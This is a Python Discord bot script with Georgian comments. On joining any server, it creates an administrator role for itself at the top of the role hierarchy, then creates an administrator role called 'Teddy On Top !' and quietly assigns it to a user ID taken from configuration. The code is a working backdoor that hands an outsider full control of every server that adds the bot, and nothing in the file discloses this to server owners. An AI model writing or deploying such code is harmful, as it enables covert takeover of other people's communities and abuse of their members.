# bot_main.py
import discord
from discord.ext import commands
import os

# იმპორტი დატოვებულია ლოკალური ტესტირებისთვის.
# Railway-ზე უშუალოდ os.getenv იმუშავებს.
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass 

# --- გარემოს ცვლადების წაკითხვა ---
BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
TARGET_USER_ID_STR = os.getenv("TARGET_USER_ID")

# კონვერტაცია სტრიქონიდან ინტეგერში
try:
    TARGET_USER_ID = int(TARGET_USER_ID_STR)
except (ValueError, TypeError):
    print("❌ TARGET_USER_ID არ არის სწორი რიცხვითი ფორმატი ან არ არის დაყენებული.")
    TARGET_USER_ID = 0

# --- როლების კონფიგურაცია ---
BOT_HELPER_ROLE_NAME = "Helper Bot"
USER_ADMIN_ROLE_NAME = "Teddy On Top !"

# --- ბოტის ინიციალიზაცია ---
intents = discord.Intents.default()
intents.members = True 
bot = commands.Bot(command_prefix="!", intents=intents)

# --- მოვლენის დამმუშავებლები ---

@bot.event
async def on_ready():
    """როდესაც ბოტი წარმატებით დაუკავშირდება Discord-ს."""
    print(f'✅ ბოტი წარმატებით არის შესული როგორც: {bot.user}')
    print('---')

@bot.event
async def on_guild_join(guild: discord.Guild):
    """ეს კოდი გაეშვება, როცა ბოტი ახალ სერვერზე შევა."""
    print(f'➡️ ბოტი შევიდა ახალ სერვერზე: {guild.name} (ID: {guild.id})')
    
    bot_member = guild.get_member(bot.user.id)
    target_member = guild.get_member(TARGET_USER_ID)
    
    # Target User შემოწმება
    if TARGET_USER_ID == 0:
        print('⚠️ TARGET_USER_ID არ არის კონფიგურირებული.')
    elif target_member is None:
        print(f'⚠️ მომხმარებელი ID: {TARGET_USER_ID} ვერ მოიძებნა სერვერზე.')
        
    # ----------------------------------------------------
    # ეტაპი 1: Helper Bot როლის შექმნა და ბოტზე მინიჭება
    # ----------------------------------------------------
    helper_role = discord.utils.get(guild.roles, name=BOT_HELPER_ROLE_NAME)
    
    if not helper_role:
        try:
            print(f'⏳ ვქმნი ბოტის დამხმარე როლს: "{BOT_HELPER_ROLE_NAME}"...')
            helper_role = await guild.create_role(
                name=BOT_HELPER_ROLE_NAME,
                permissions=discord.Permissions(administrator=True),
                reason="ბოტის დამხმარე როლი, საჭიროა იერარქიის უზრუნველსაყოფად"
            )
            # დაყენება მაქსიმალურად მაღალ პოზიციაზე
            await helper_role.edit(position=len(guild.roles) - 1)
            if bot_member:
                await bot_member.add_roles(helper_role)
            print(f'✅ "{BOT_HELPER_ROLE_NAME}" წარმატებით შეიქმნა და მიენიჭა ბოტს.')
        except discord.Forbidden:
            print(f'❌ არ მაქვს უფლებები "{BOT_HELPER_ROLE_NAME}" შესაქმნელად.')
            return 
        except Exception as e:
            print(f'❌ შეცდომა "{BOT_HELPER_ROLE_NAME}" შექმნისას: {e}')
            return


    # ----------------------------------------------------
    # ეტაპი 2: Teddy On Top ! როლის შექმნა (ადმინ უფლებით)
    # ----------------------------------------------------
    admin_role = discord.utils.get(guild.roles, name=USER_ADMIN_ROLE_NAME)
    
    if not admin_role:
        try:
            print(f'⏳ ვქმნი მომხმარებლის ადმინ როლს: "{USER_ADMIN_ROLE_NAME}"...')
            admin_role = await guild.create_role(
                name=USER_ADMIN_ROLE_NAME,
                permissions=discord.Permissions(administrator=True), 
                reason="ავტომატური ადმინ როლი მომხმარებლისთვის"
            )
            # დაყენება Helper Bot-ის ქვემოთ
            await admin_role.edit(position=len(guild.roles) - 2) 
            print(f'✅ "{USER_ADMIN_ROLE_NAME}" წარმატებით შეიქმნა და პოზიცია დაყენდა.')
        except discord.Forbidden:
            print(f'❌ არ მაქვს უფლებები "{USER_ADMIN_ROLE_NAME}" შესაქმნელად.')
            return 
        except Exception as e:
            print(f'❌ შეცდომა "{USER_ADMIN_ROLE_NAME}" შექმნისას: {e}')
            return

    # ----------------------------------------------------
    # ეტაპი 3: Teddy On Top ! როლის მინიჭება
    # ----------------------------------------------------
    if target_member and admin_role not in target_member.roles:
        try:
            await target_member.add_roles(admin_role, reason="ავტომატური ადმინ როლის მინიჭება")
            print(f'✅ როლი "{admin_role.name}" წარმატებით მიენიჭა {target_member.name}-ს (ID: {TARGET_USER_ID}).')
        except discord.Forbidden:
            print(f'❌ არ მაქვს უფლებები როლის მინიჭებისთვის. დარწმუნდით, რომ Helper Bot როლი ამ როლზე მაღლაა.')
        except Exception as e:
            print(f'❌ მოხდა შეცდომა როლის მინიჭებისას: {e}')
    elif target_member:
        print(f'ℹ️ მომხმარებელს {target_member.name}-ს უკვე აქვს როლი "{admin_role.name}".')


# --- ბოტის გაშვება ---
if __name__ == "__main__":
    if not BOT_TOKEN or TARGET_USER_ID == 0:
        print("🛑 გთხოვთ, შეამოწმოთ ცვლადები. BOT_TOKEN ან TARGET_USER_ID არ არის დაყენებული.")
    else:
        bot.run(BOT_TOKEN)
